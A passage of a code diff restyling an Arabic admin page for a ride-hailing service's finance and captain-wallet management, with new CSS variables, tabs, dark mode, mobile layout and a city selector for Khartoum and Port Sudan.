@@ -3,669 +3,901 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>الإدارة المالية | وجيز</title>
+    <title>الإدارة المالية والمحافظ | وجيز</title>
     <link href="vendor/fonts/fonts.css" rel="stylesheet">
     <link href="vendor/bootstrap/bootstrap.rtl.min.css" rel="stylesheet">
     <link rel="stylesheet" href="vendor/fontawesome/css/all.min.css">
     <script src="vendor/sweetalert2/sweetalert2.all.min.js"></script>
-    <script src="js/config.js?v=b84e6b6a"></script>
-    <script src="js/admin-cache-buster.js?v=d70c699f"></script>
-    <script src="js/auth-helper.js?v=849c502f"></script>
+    <script src="js/config.js?v=6706269c"></script>
+    <script src="js/admin-cache-buster.js?v=e06570f2"></script>
+    <script src="js/auth-helper.js?v=bf5c4a16"></script>
 
     <style>
-        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
         :root {
-            --brand:      #04553A;
-            --brand-dark: #076b43;
-            --brand-glow: rgba(10,135,84,0.18);
-            --danger:     #e53e3e;
-            --warning:    #d97706;
-            --surface:    #ffffff;
-            --bg:         #f0f4f8;
-            --border:     #e2e8f0;
-            --text:       #1a202c;
-            --muted:      #718096;
-            --radius:     16px;
-            --shadow:     0 4px 24px rgba(0,0,0,0.07);
-            --shadow-lg:  0 8px 40px rgba(0,0,0,0.12);
+            --primary: #048c5b;
+            --primary-dark: #036943;
+            --primary-gradient: linear-gradient(135deg, #048c5b 0%, #0A6E47 100%);
+            --accent: #f59e0b;
+            --brand-glow: rgba(4, 140, 91, 0.18);
+            --danger: #ef4444;
+            --danger-gradient: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            --warning: #f59e0b;
+            --warning-gradient: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            --info: #3b82f6;
+            --info-gradient: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            --surface: #ffffff;
+            --bg: #f8fafc;
+            --border: #e2e8f0;
+            --text: #0f172a;
+            --muted: #64748b;
+            --radius-sm: 10px;
+            --radius-md: 16px;
+            --radius-lg: 24px;
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.04);
+            --shadow-md: 0 4px 20px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 30px rgba(0,0,0,0.1);
         }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Cairo', sans-serif;
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
         }
 
-        /* ─────────── TOPBAR ─────────── */
+        /* ────────── TOPBAR ────────── */
         .topbar {
-            background: white;
+            background: var(--surface);
             border-bottom: 1px solid var(--border);
             padding: 0 28px;
-            height: 64px;
+            height: 70px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             position: sticky; top: 0; z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            box-shadow: var(--shadow-sm);
+            backdrop-filter: blur(12px);
         }
-        .topbar-brand { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 18px; }
-        .topbar-brand .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--brand); display: inline-block; }
+        .topbar-brand {
+            display: flex; align-items: center; gap: 12px;
+            font-weight: 800; font-size: 18px; color: var(--text);
+        }
+        .topbar-brand .brand-badge {
+            width: 38px; height: 38px; border-radius: 12px;
+            background: var(--primary-gradient);
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-size: 18px; box-shadow: 0 4px 12px var(--brand-glow);
+        }
+        .topbar-actions { display: flex; align-items: center; gap: 12px; }
         .topbar-back {
             display: flex; align-items: center; gap: 8px;
-            color: var(--muted); font-size: 14px; font-weight: 600;
-            text-decoration: none; padding: 8px 16px; border-radius: 30px;
-            border: 1px solid var(--border); transition: all .2s;
+            color: var(--muted); font-size: 14px; font-weight: 700;
+            text-decoration: none; padding: 9px 18px; border-radius: 30px;
+            border: 1px solid var(--border); transition: all .2s ease;
+            background: var(--surface);
         }
-        .topbar-back:hover { background: var(--brand); color: white; border-color: var(--brand); }
+        .topbar-back:hover {
+            background: var(--primary); color: white; border-color: var(--primary);
+            box-shadow: 0 4px 12px var(--brand-glow);
+        }
 
-        /* ─────────── LAYOUT ─────────── */
-        .page-wrap { max-width: 1100px; margin: 0 auto; padding: 32px 20px 60px; }
+        /* ────────── LAYOUT ────────── */
+        .page-wrap { max-width: 1240px; margin: 0 auto; padding: 28px 20px 60px; }
 
-        /* ─────────── PAGE HEADER ─────────── */
-        .page-header { margin-bottom: 32px; }
-        .page-header h1 { font-size: 26px; font-weight: 900; }
-        .page-header p  { color: var(--muted); font-size: 14px; margin-top: 4px; }
+        /* ────────── CITY SELECTOR BANNER ────────── */
+        .city-banner {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-md);
+            padding: 20px 24px;
+            margin-bottom: 28px;
+            display: flex; align-items: center; justify-content: space-between;
+            flex-wrap: wrap; gap: 16px;
+            box-shadow: var(--shadow-md);
+            position: relative; overflow: hidden;
+        }
+        .city-banner::before {
+            content: ''; position: absolute; right: 0; top: 0; bottom: 0; width: 6px;
+            background: var(--primary-gradient);
+        }
+        .city-info { display: flex; align-items: center; gap: 14px; }
+        .city-icon {
+            width: 48px; height: 48px; border-radius: 14px;
+            background: rgba(4, 140, 91, 0.1); color: var(--primary);
+            display: flex; align-items: center; justify-content: center; font-size: 22px;
+        }
+        .city-text-title { font-weight: 800; font-size: 16px; color: var(--text); }
+        .city-text-sub { font-size: 13px; color: var(--muted); }
+        .city-pills { display: flex; gap: 10px; }
+        .city-btn {
+            padding: 10px 22px; border-radius: 30px; border: 2px solid var(--border);
+            background: var(--surface); color: var(--muted);
+            font-weight: 700; font-size: 14px; cursor: pointer; transition: all .2s ease;
+            display: inline-flex; align-items: center; gap: 8px;
+        }
+        .city-btn:hover { border-color: var(--primary); color: var(--primary); }
+        .city-btn.active-city {
+            background: var(--primary-gradient) !important;
+            color: #fff !important; border-color: transparent !important;
+            box-shadow: 0 4px 14px var(--brand-glow);
+        }
 
-        /* ─────────── KPI CARDS ─────────── */
-        .kpi-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(200px,1fr)); gap: 18px; margin-bottom: 32px; }
+        /* ────────── PAGE HEADER ────────── */
+        .page-header {
+            margin-bottom: 28px;
+            display: flex; align-items: center; justify-content: space-between;
+            flex-wrap: wrap; gap: 16px;
+        }
+        .page-header-title { font-size: 26px; font-weight: 900; color: var(--text); }
+        .page-header-sub { color: var(--muted); font-size: 14px; margin-top: 4px; }
+        .page-header-actions { display: flex; gap: 10px; flex-wrap: wrap; }
+
+        /* ────────── KPI CARDS GRID ────────── */
+        .kpi-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin-bottom: 32px; }
         .kpi-card {
-            background: white; border-radius: var(--radius);
-            padding: 22px; box-shadow: var(--shadow);
-            border-top: 4px solid var(--border);
-            transition: transform .2s, box-shadow .2s;
+            background: var(--surface); border-radius: var(--radius-md);
+            padding: 22px; box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border);
+            position: relative; overflow: hidden;
+            transition: transform .2s ease, box-shadow .2s ease;
         }
-        .kpi-card:hover { transform: translateY(-3px); box-shadow: var(--shadow-lg); }
-        .kpi-card.green  { border-top-color: var(--brand); }
-        .kpi-card.red    { border-top-color: var(--danger); }
-        .kpi-card.orange { border-top-color: var(--warning); }
-        .kpi-card.blue   { border-top-color: #3182ce; }
-        .kpi-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-bottom: 14px; }
-        .kpi-icon.green  { background: rgba(10,135,84,0.1);  color: var(--brand); }
-        .kpi-icon.red    { background: rgba(229,62,62,0.1);  color: var(--danger); }
-        .kpi-icon.orange { background: rgba(217,119,6,0.1);  color: var(--warning); }
-        .kpi-icon.blue   { background: rgba(49,130,206,0.1); color: #3182ce; }
-        .kpi-label { font-size: 12px; color: var(--muted); font-weight: 600; letter-spacing: .3px; }
-        .kpi-value { font-size: 28px; font-weight: 900; margin-top: 4px; }
+        .kpi-card:hover { transform: translateY(-3px); box-shadow: var(--shadow-md); }
+        .kpi-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+        }
+        .kpi-card.green::before { background: var(--primary); }
+        .kpi-card.red::before { background: var(--danger); }
+        .kpi-card.orange::before { background: var(--warning); }
+        .kpi-card.blue::before { background: var(--info); }
 
-        /* ─────────── SECTION CARD ─────────── */
+        .kpi-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
+        .kpi-icon {
+            width: 46px; height: 46px; border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 20px;
+        }
+        .kpi-icon.green  { background: rgba(4, 140, 91, 0.1);  color: var(--primary); }
+        .kpi-icon.red    { background: rgba(239, 68, 68, 0.1);  color: var(--danger); }
+        .kpi-icon.orange { background: rgba(245, 158, 11, 0.1); color: var(--warning); }
+        .kpi-icon.blue   { background: rgba(59, 130, 246, 0.1);  color: var(--info); }
+        .kpi-label { font-size: 13px; color: var(--muted); font-weight: 700; }
+        .kpi-value { font-size: 28px; font-weight: 900; color: var(--text); }
+
+        /* ────────── MAIN NAV TABS ────────── */
+        .nav-tabs-wrapper {
+            background: var(--surface);
+            border-radius: var(--radius-md);
+            padding: 8px; margin-bottom: 24px;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-sm);
+            display: flex; gap: 8px; overflow-x: auto; scrollbar-width: none;
+        }
+        .nav-tabs-wrapper::-webkit-scrollbar { display: none; }
+        .tab-btn {
+            flex: 1; min-width: 170px; padding: 12px 18px;
+            border-radius: var(--radius-sm); border: none;
+            background: transparent; color: var(--muted);
+            font-weight: 700; font-size: 14px; font-family: 'Cairo', sans-serif;
+            cursor: pointer; transition: all .2s ease;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            white-space: nowrap;
+        }
+        .tab-btn:hover { color: var(--primary); background: rgba(4, 140, 91, 0.05); }
+        .tab-btn.active {
+            background: var(--primary-gradient); color: white;
+            box-shadow: 0 4px 14px var(--brand-glow);
+        }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; animation: fadeIn .3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* ────────── SECTION CARD ────────── */
         .section-card {
-            background: white; border-radius: var(--radius);
-            box-shadow: var(--shadow); margin-bottom: 28px; overflow: hidden;
+            background: var(--surface); border-radius: var(--radius-md);
+            border: 1px solid var(--border); box-shadow: var(--shadow-sm);
+            margin-bottom: 28px; overflow: hidden;
         }
         .section-card-header {
             padding: 20px 24px; border-bottom: 1px solid var(--border);
-            display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px;
+            display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px;
+            background: var(--surface);
         }
-        .section-card-header h2 { font-size: 17px; font-weight: 800; display: flex; align-items: center; gap: 10px; }
-        .section-card-header h2 i { color: var(--brand); }
+        .section-card-header h2 { font-size: 17px; font-weight: 800; display: flex; align-items: center; gap: 10px; margin: 0; color: var(--text); }
+        .section-card-header h2 i { color: var(--primary); }
         .section-card-body { padding: 24px; }
 
-        /* ─────────── SETTINGS GRID ─────────── */
-        .settings-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px,1fr)); gap: 20px; }
+        /* ────────── SEARCH & FILTER CONTROLS ────────── */
+        .search-box {
+            position: relative; min-width: 240px; flex: 1; max-width: 320px;
+        }
+        .search-box input {
+            width: 100%; padding: 8px 14px 8px 38px; border-radius: 30px;
+            border: 1px solid var(--border); font-size: 13px; font-family: 'Cairo', sans-serif;
+            outline: none; background: var(--bg); color: var(--text);
+            transition: all .2s ease;
+        }
+        .search-box input:focus { border-color: var(--primary); background: var(--surface); }
+        .search-box i { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted); font-size: 13px; }
+
+        .filter-pills { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+        .pill {
+            padding: 7px 18px; border-radius: 30px; font-size: 13px; font-weight: 700;
+            border: 1px solid var(--border); cursor: pointer; transition: all .2s ease;
+            background: var(--surface); color: var(--muted);
+        }
+        .pill.active, .pill:hover { background: var(--primary-gradient); color: white; border-color: transparent; box-shadow: 0 4px 12px var(--brand-glow); }
+
+        /* ────────── SETTINGS GRID ────────── */
+        .settings-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; }
         .field-group { display: flex; flex-direction: column; gap: 6px; }
         .field-label { font-size: 13px; font-weight: 700; color: var(--text); }
         .field-hint  { font-size: 12px; color: var(--muted); margin-top: 2px; }
         .field-input {
-            border: 2px solid var(--border); border-radius: 12px;
-            padding: 12px 16px; font-size: 15px; font-family: 'Cairo',sans-serif;
-            outline: none; transition: border-color .2s, box-shadow .2s;
-            width: 100%; direction: rtl; background: #fafafa;
+            border: 1.5px solid var(--border); border-radius: 12px;
+            padding: 11px 16px; font-size: 14px; font-family: 'Cairo', sans-serif;
+            outline: none; transition: all .2s ease;
+            width: 100%; direction: rtl; background: var(--bg); color: var(--text);
         }
-        .field-input:focus { border-color: var(--brand); box-shadow: 0 0 0 4px var(--brand-glow); background: white; }
+        .field-input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px var(--brand-glow); background: var(--surface); }
 
-        /* ─────────── BUTTONS ─────────── */
+        /* ────────── BUTTONS ────────── */
         .btn-brand {
-            background: linear-gradient(135deg, var(--brand), var(--brand-dark));
+            background: var(--primary-gradient);
             color: white; border: none; border-radius: 30px;
-            padding: 11px 28px; font-size: 14px; font-weight: 700;
-            font-family: 'Cairo',sans-serif; cursor: pointer;
+            padding: 10px 24px; font-size: 14px; font-weight: 700;
+            font-family: 'Cairo', sans-serif; cursor: pointer;
             display: inline-flex; align-items: center; gap: 8px;
-            transition: opacity .2s, transform .15s; box-shadow: 0 4px 14px var(--brand-glow);
+            transition: all .2s ease; box-shadow: 0 4px 14px var(--brand-glow);
         }
-        .btn-brand:hover   { opacity: .92; transform: translateY(-1px); }
-        .btn-brand:active  { transform: scale(.97); }
+        .btn-brand:hover { opacity: .92; transform: translateY(-1px); }
+        .btn-brand:active { transform: scale(.97); }
         .btn-brand:disabled { opacity: .55; cursor: not-allowed; }
 
         .btn-approve {
-            background: linear-gradient(135deg,#22c55e,#16a34a);
+            background: linear-gradient(135deg, #22c55e, #16a34a);
             color: white; border: none; border-radius: 8px;
             padding: 7px 16px; font-size: 13px; font-weight: 700;
-            font-family: 'Cairo',sans-serif; cursor: pointer;
+            font-family: 'Cairo', sans-serif; cursor: pointer;
             display: inline-flex; align-items: center; gap: 6px;
-            transition: opacity .2s, transform .15s;
-            box-shadow: 0 3px 10px rgba(34,197,94,0.3);
+            transition: all .15s ease; box-shadow: 0 3px 10px rgba(34,197,94,0.25);
         }
         .btn-approve:hover:not(:disabled) { opacity: .9; transform: translateY(-1px); }
-        .btn-approve:disabled { opacity:.5; cursor:not-allowed; }
+        .btn-approve:disabled { opacity: .5; cursor: not-allowed; }
 
         .btn-reject {
-            background: linear-gradient(135deg,#ef4444,#dc2626);
+            background: var(--danger-gradient);
             color: white; border: none; border-radius: 8px;
             padding: 7px 16px; font-size: 13px; font-weight: 700;
-            font-family: 'Cairo',sans-serif; cursor: pointer;
+            font-family: 'Cairo', sans-serif; cursor: pointer;
             display: inline-flex; align-items: center; gap: 6px;
-            transition: opacity .2s, transform .15s;
-            box-shadow: 0 3px 10px rgba(239,68,68,0.3);
+            transition: all .15s ease; box-shadow: 0 3px 10px rgba(239,68,68,0.25);
         }
         .btn-reject:hover:not(:disabled) { opacity: .9; transform: translateY(-1px); }
-        .btn-reject:disabled { opacity:.5; cursor:not-allowed; }
+        .btn-reject:disabled { opacity: .5; cursor: not-allowed; }
 
-        /* ─────────── FILTER PILLS ─────────── */
-        .filter-pills { display: flex; gap: 8px; flex-wrap: wrap; }
-        .pill {
-            padding: 6px 18px; border-radius: 30px; font-size: 13px; font-weight: 600;
-            border: 2px solid var(--border); cursor: pointer; transition: all .2s;
-            background: white; color: var(--muted);
-        }
-        .pill.active, .pill:hover { background: var(--brand); color: white; border-color: var(--brand); }
-
-        /* ─────────── PAYMENTS TABLE ─────────── */
-        .pay-table { width: 100%; border-collapse: collapse; }
-        .pay-table thead tr { background: #f8fafc; }
+        /* ────────── PAYMENTS TABLE ────────── */
+        .table-wrap { overflow-x: auto; }
+        .pay-table { width: 100%; border-collapse: collapse; text-align: right; }
+        .pay-table thead tr { background: var(--bg); }
         .pay-table th {
-            padding: 12px 16px; font-size: 12px; font-weight: 700;
-            color: var(--muted); text-align: right; letter-spacing: .3px;
-            border-bottom: 2px solid var(--border); white-space: nowrap;
+            padding: 14px 18px; font-size: 12px; font-weight: 700;
+            color: var(--muted); letter-spacing: .3px;
+            border-bottom: 1px solid var(--border); white-space: nowrap;
         }
         .pay-table td {
-            padding: 14px 16px; font-size: 14px; font-weight: 500;
+            padding: 14px 18px; font-size: 14px; font-weight: 600;
             border-bottom: 1px solid var(--border); vertical-align: middle;
         }
-        .pay-table tbody tr { transition: background .15s; }
-        .pay-table tbody tr:hover { background: #f8fafc; }
+        .pay-table tbody tr { transition: background .15s ease; }
+        .pay-table tbody tr:hover { background: rgba(4, 140, 91, 0.02); }
         .pay-table tbody tr:last-child td { border-bottom: none; }
 
-        /* Captain cell */
-        .captain-cell { display: flex; align-items: center; gap: 10px; }
+        /* Captain Avatar Cell */
+        .captain-cell { display: flex; align-items: center; gap: 12px; }
         .captain-avatar {
-            width: 38px; height: 38px; border-radius: 50%;
-            background: linear-gradient(135deg,#04553A,#0A6E47);
+            width: 40px; height: 40px; border-radius: 50%;
+            background: var(--primary-gradient);
             display: flex; align-items: center; justify-content: center;
-            font-weight: 800; font-size: 14px; color: white; flex-shrink: 0;
+            font-weight: 800; font-size: 15px; color: white; flex-shrink: 0;
+            box-shadow: 0 2px 8px var(--brand-glow);
         }
-        .captain-name   { font-weight: 700; font-size: 14px; }
+        .captain-name   { font-weight: 700; font-size: 14px; color: var(--text); }
         .captain-phone  { font-size: 12px; color: var(--muted); }
 
-        /* Balance chip */
+        /* Balance Chips & Badges */
         .balance-chip {
             display: inline-flex; align-items: center; gap: 5px;
-            padding: 4px 10px; border-radius: 20px; font-size: 13px; font-weight: 700;
+            padding: 4px 12px; border-radius: 20px; font-size: 13px; font-weight: 700;
         }
-        .balance-chip.neg { background: rgba(229,62,62,0.08); color: var(--danger); }
-        .balance-chip.pos { background: rgba(34,197,94,0.08);  color: #16a34a; }
+        .balance-chip.neg { background: rgba(239,68,68,0.1); color: var(--danger); }
+        .balance-chip.pos { background: rgba(34,197,94,0.1); color: #16a34a; }
 
-        /* Status badge */
         .status-badge {
             display: inline-flex; align-items: center; gap: 5px;
             padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
         }
-        .status-badge.pending  { background: rgba(217,119,6,0.1);  color: var(--warning); }
-        .status-badge.approved { background: rgba(34,197,94,0.1);   color: #16a34a; }
-        .status-badge.rejected { background: rgba(229,62,62,0.1);   color: var(--danger); }
+        .status-badge.pending  { background: rgba(245,158,11,0.15); color: #b45309; }
+        .status-badge.approved { background: rgba(34,197,94,0.15);  color: #15803d; }
+        .status-badge.rejected { background: rgba(239,68,68,0.15);  color: #b91c1c; }
 
-        /* Receipt thumbnail */
+        /* Receipt Thumbnail */
         .receipt-thumb {
-            width: 44px; height: 44px; border-radius: 8px; object-fit: cover;
+            width: 44px; height: 44px; border-radius: 10px; object-fit: cover;
             cursor: pointer; border: 2px solid var(--border);
-            transition: transform .2s, box-shadow .2s;
+            transition: transform .2s ease, box-shadow .2s ease;
         }
-        .receipt-thumb:hover { transform: scale(1.1); box-shadow: var(--shadow); }
+        .receipt-thumb:hover { transform: scale(1.1); box-shadow: var(--shadow-md); border-color: var(--primary); }
         .no-receipt { font-size: 12px; color: var(--muted); }
 
         /* Empty state */
-        .empty-state {
-            text-align: center; padding: 60px 20px; color: var(--muted);
-        }
-        .empty-state i { font-size: 48px; margin-bottom: 16px; opacity:.3; }
-        .empty-state p { font-size: 15px; }
+        .empty-state { text-align: center; padding: 50px 20px; color: var(--muted); }
+        .empty-state i { font-size: 46px; margin-bottom: 14px; opacity: .35; }
+        .empty-state p { font-size: 15px; font-weight: 600; }
 
-        /* ─────────── TOAST ─────────── */
+        /* TOAST & LIGHTBOX */
         #toastBox {
             position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
             z-index: 99999; display: flex; flex-direction: column; gap: 10px;
             pointer-events: none;
         }
         .toast-msg {
-            padding: 14px 24px; border-radius: 14px; font-size: 14px; font-weight: 700;
-            font-family: 'Cairo',sans-serif; color: white;
+            padding: 12px 24px; border-radius: 14px; font-size: 14px; font-weight: 700;
+            font-family: 'Cairo', sans-serif; color: white;
             box-shadow: 0 8px 30px rgba(0,0,0,0.2);
             animation: toastIn .35s ease; pointer-events: auto;
             display: flex; align-items: center; gap: 10px; min-width: 260px;
         }
         .toast-msg.success { background: linear-gradient(135deg,#22c55e,#16a34a); }
-        .toast-msg.error   { background: linear-gradient(135deg,#ef4444,#dc2626); }
-        @keyframes toastIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to   { opacity: 1; transform: translateY(0); }
-        }
+        .toast-msg.error   { background: var(--danger-gradient); }
+        @keyframes toastIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* ─────────── RECEIPT LIGHTBOX ─────────── */
         #receiptLightbox {
             display: none; position: fixed; inset: 0;
             background: rgba(0,0,0,.85); z-index: 999999;
-            align-items: center; justify-content: center;
+            align-items: center; justify-content: center; backdrop-filter: blur(8px);
         }
         #receiptLightbox img {
-            max-width: 90vw; max-height: 85vh; border-radius: 12px;
+            max-width: 90vw; max-height: 85vh; border-radius: 14px;
             object-fit: contain; box-shadow: 0 20px 60px rgba(0,0,0,.5);
         }
         #receiptLightbox .close-lb {
-            position: absolute; top: 20px; left: 20px;
+            position: absolute; top: 24px; left: 24px;
             background: white; border: none; border-radius: 50%;
-            width: 40px; height: 40px; font-size: 18px; cursor: pointer;
+            width: 44px; height: 44px; font-size: 20px; cursor: pointer;
             display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform .2s ease;
         }
+        #receiptLightbox .close-lb:hover { transform: scale(1.1); }
 
-        /* ─────────── SPINNER ─────────── */
         @keyframes spin { to { transform: rotate(360deg); } }
         .spin { animation: spin .8s linear infinite; }
-
-        /* Loading row */
         .loading-row td { text-align: center; padding: 40px; color: var(--muted); }
 
-        /* Scrollable table */
-        .table-wrap { overflow-x: auto; }
+        /* DARK MODE SUPPORT */
+        body.dark-mode {
+            --surface: #1e293b;
+            --bg: #0f172a;
+            --border: #334155;
+            --text: #f8fafc;
+            --muted: #94a3b8;
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.4);
+            --shadow-md: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        body.dark-mode .topbar,
+        body.dark-mode .city-banner,
+        body.dark-mode .kpi-card,
+        body.dark-mode .nav-tabs-wrapper,
+        body.dark-mode .section-card,
+        body.dark-mode .section-card-header,
+        body.dark-mode .pill,
+        body.dark-mode .topbar-back {
+            background: var(--surface) !important;
+            color: var(--text) !important;
+            border-color: var(--border) !important;
+        }
+        body.dark-mode .field-input,
+        body.dark-mode .search-box input,
+        body.dark-mode .pay-table thead tr {
+            background: var(--bg) !important;
+            color: var(--text) !important;
+            border-color: var(--border) !important;
+        }
+        body.dark-mode .pill.active {
+            background: var(--primary-gradient) !important;
+            color: white !important;
+        }
+
+        /* 📱 ANDROID & MOBILE RESPONSIVE OPTIMIZATIONS */
+        @media (max-width: 768px) {
+            .topbar { padding: 0 16px; height: 60px; }
+            .topbar-brand { font-size: 15px; }
+            .topbar-brand .brand-badge { width: 34px; height: 34px; font-size: 15px; }
+            .topbar-back { padding: 6px 12px; font-size: 12px; }
+            
+            .page-wrap { padding: 16px 12px 40px; }
+            .city-banner { padding: 14px 16px; flex-direction: column; align-items: stretch; gap: 12px; }
+            .city-pills { justify-content: stretch; width: 100%; }
+            .city-btn { flex: 1; justify-content: center; padding: 8px 14px; font-size: 13px; }
+            
+            .page-header { flex-direction: column; align-items: stretch; gap: 12px; }
+            .page-header-title { font-size: 20px; }
+            .page-header-actions { flex-direction: column; }
+            .page-header-actions .btn-brand { width: 100%; justify-content: center; }
+
+            .kpi-grid { grid-template-columns: repeat(2, 1fr); gap: 10px; }
+            .kpi-card { padding: 14px; }
+            .kpi-value { font-size: 20px; }
+            .kpi-icon { width: 36px; height: 36px; font-size: 16px; }
+
+            .nav-tabs-wrapper {
+                padding: 4px; gap: 4px;
+                -webkit-overflow-scrolling: touch;
+            }
+            .tab-btn { min-width: 140px; padding: 9px 12px; font-size: 12.5px; }
+
+            .section-card-header { padding: 14px 16px; flex-direction: column; align-items: stretch; gap: 10px; }
+            .section-card-body { padding: 16px; }
+
+            .search-box { max-width: 100%; width: 100%; }
+            .filter-pills { width: 100%; overflow-x: auto; padding-bottom: 4px; }
+            .pill { padding: 5px 12px; font-size: 12px; }
+
+            .settings-grid { grid-template-columns: 1fr; gap: 14px; }
+            .btn-brand { width: 100%; justify-content: center; }
+        }
+
+        @media (max-width: 480px) {
+            .kpi-grid { grid-template-columns: 1fr; }
+        }
     </style>
-    <link rel="stylesheet" href="css/dark-mode.css?v=f21a3ab5">
-    <script src="js/safe-area.js?v=58b4c12a"></script>
-    <link rel="stylesheet" href="css/admin-mobile.css?v=8b40df15">
-    <script src="js/admin-mobile.js?v=8b40df15"></script>
+    <link rel="stylesheet" href="css/dark-mode.css?v=c04e8b17">
+    <script src="js/safe-area.js?v=176d6050"></script>
+    <link rel="stylesheet" href="css/admin-mobile.css?v=5dce3f40">
+    <script src="js/admin-mobile.js?v=6ad27bdf"></script>
+    <script src="js/theme-manager.js?v=a33a528b"></script>
 </head>
 <body>
 
 <!-- ── TOPBAR ─────────────────────────────────────── -->
 <header class="topbar">
     <div class="topbar-brand">
-        <span class="dot"></span>
+        <div class="brand-badge"><i class="fas fa-wallet"></i></div>
         الإدارة المالية والمحافظ
     </div>
-    <a href="admin.html" class="topbar-back">
-        <i class="fas fa-arrow-right"></i> لوحة التحكم
-    </a>
+    <div class="topbar-actions">
+        <a href="admin.html" class="topbar-back">
+            <i class="fas fa-arrow-right"></i> لوحة التحكم
+        </a>
+    </div>
 </header>
 
-<!-- ── TOAST BOX ──────────────────────────────────── -->
+<!-- ── TOAST & LIGHTBOX ────────────────────────────── -->
 <div id="toastBox"></div>
-
-<!-- ── RECEIPT LIGHTBOX ───────────────────────────── -->
 <div id="receiptLightbox">
     <button class="close-lb" onclick="closeLightbox()"><i class="fas fa-times"></i></button>
     <img id="lightboxImg" src="" alt="إشعار السداد">
 </div>
 
-<!-- ── PAGE CONTENT ───────────────────────────────── -->
+<!-- ── PAGE CONTAINER ──────────────────────────────── -->
 <div class="page-wrap">
 
-    <!-- ── CITY SELECTOR ──────────────────────────────────── -->
-    <div style="background:#fff;border:2px solid #04553A;border-radius:16px;padding:18px 24px;margin-bottom:28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 4px 18px rgba(10,135,84,0.1);">
-        <div style="display:flex;align-items:center;gap:10px;flex:1;min-width:200px;">
-            <i class="fas fa-city" style="color:#04553A;font-size:22px;"></i>
+    <!-- ── CITY SELECTOR BANNER ──────────────────────── -->
+    <div class="city-banner">
+        <div class="city-info">
+            <div class="city-icon"><i class="fas fa-city"></i></div>
             <div>
-                <div style="font-weight:800;font-size:15px;color:#1a202c;">المدينة الحالية</div>
-                <div style="font-size:12px;color:#718096;">الإعدادات المالية والتسعيرة تُطبَّق على المدينة المختارة فقط</div>
+                <div class="city-text-title">المدينة الحالية للإدارة المالية</div>
+                <div class="city-text-sub">الإعدادات المالية والتسعيرة تُطبق على المدينة المختارة فقط</div>
             </div>
         </div>
-        <div style="display:flex;gap:10px;">
-            <button id="cityBtn-Khartoum" onclick="switchFinanceCity('Khartoum')" style="padding:10px 22px;border-radius:30px;border:2px solid #04553A;background:#04553A;color:#fff;font-family:Cairo;font-weight:700;font-size:14px;cursor:pointer;transition:all .2s;">
-                <i class="fas fa-city"></i> الخرطوم
+        <div class="city-pills">
+            <button id="cityBtn-Khartoum" class="city-btn active-city" onclick="switchFinanceCity('Khartoum')">
+                <i class="fas fa-building"></i> الخرطوم
             </button>
-            <button id="cityBtn-PortSudan" onclick="switchFinanceCity('PortSudan')" style="padding:10px 22px;border-radius:30px;border:2px solid #04553A;background:#fff;color:#04553A;font-family:Cairo;font-weight:700;font-size:14px;cursor:pointer;transition:all .2s;">
+            <button id="cityBtn-PortSudan" class="city-btn" onclick="switchFinanceCity('PortSudan')">
                 <i class="fas fa-anchor"></i> بورتسودان
             </button>
         </div>
     </div>
 
+    <!-- ── PAGE HEADER ────────────────────────────────── -->
     <div class="page-header">
-        <h1><i class="fas fa-wallet" style="color:#04553A;margin-left:10px;"></i> الإدارة المالية والمحافظ</h1>
-        <p id="finCityLabel">مراجعة وإدارة مديونيات الكباتن وطلبات السداد وإعدادات العمولة — الخرطوم</p>
-        <div style="margin-top:14px;display:flex;gap:10px;flex-wrap:wrap;">
+        <div>
+            <h1 class="page-header-title">نظام التحكم المحاسبي والمالي</h1>
+            <p id="finCityLabel" class="page-header-sub">مراجعة وإدارة مديونيات الكباتن وطلبات السداد وإعدادات العمولة والتسعيرة</p>
+        </div>
